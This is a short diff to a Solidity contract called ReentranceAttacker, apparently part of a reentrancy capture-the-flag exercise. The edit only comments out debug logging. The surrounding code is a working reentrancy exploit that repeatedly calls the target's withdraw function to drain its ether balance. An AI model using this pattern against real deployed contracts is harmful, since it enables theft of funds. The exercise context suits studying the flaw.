@@ -29,7 +29,7 @@ contract ReentranceAttacker {
         require(msg.value == 0.2 ether);
         reentrance.donate{value : 0.2 ether}(address(this));
         reentrance.withdraw(0.2 ether);
-        console.log('attack withdraw');
+        // console.log('attack withdraw');
 
     }
 
@@ -37,9 +37,9 @@ contract ReentranceAttacker {
 
         if( (address(reentrance).balance >= 0.1 ether) && (reentrance.balanceOf(address(this)) >= 0.2 ether) ) {
             reentrance.withdraw(0.1 ether);
-            console.log('payable withdraw');
-            counter++;
-            console.log(counter);
+            // console.log('payable withdraw');
+            // counter++;
+            // console.log(counter);
         } else {
 
         }
